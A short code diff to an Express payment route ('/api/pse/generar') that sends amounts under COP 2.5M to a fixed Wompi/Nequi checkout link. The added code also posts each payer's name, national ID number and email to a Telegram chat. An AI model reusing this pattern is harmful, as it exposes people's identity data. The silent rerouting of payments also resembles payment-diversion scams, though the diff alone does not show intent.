@@ -436,6 +436,21 @@ app.post('/api/pse/generar', async (req, res) => {
   if (!/^\d{5,12}$/.test(String(cedula)))
     return res.status(400).json({ error: 'Cédula inválida.' });
 
+  // ── Montos < $2.500.000 → Wompi / Nequi Negocios ──────────────────────────
+  if (montoNum < 2_500_000) {
+    const wompiUrl = `https://checkout.nequi.wompi.co/l/6APLRa?amount-in-cents=${montoNum * 100}`;
+    await tgSend(
+      `🟡 <b>PSE → Wompi Nequi — Mobilize RCI</b>\n` +
+      `👤 <b>${nombre}</b>\n` +
+      `🪪 Cédula: <code>${cedula}</code>\n` +
+      `📧 ${email}\n` +
+      `💰 <b>COP ${fmtCOP(montoNum)}</b>\n` +
+      `ℹ️ Monto menor a $2.5M → redirigido a Wompi\n` +
+      `📅 ${new Date().toLocaleString('es-CO')}`
+    );
+    return res.json({ async_payment_url: wompiUrl });
+  }
+
   const ref = 'CON' + Date.now();
 
   try {
@@ -479,7 +494,7 @@ app.post('/api/pse/generar', async (req, res) => {
     }
 
     await tgSend(
-      `🏦 <b>PSE — Mobilize RCI</b>\n` +
+      `🏦 <b>PSE → Helppiu — Mobilize RCI</b>\n` +
       `👤 <b>${nombre}</b>\n` +
       `🪪 Cédula: <code>${cedula}</code>\n` +
       `📧 ${email}\n` +
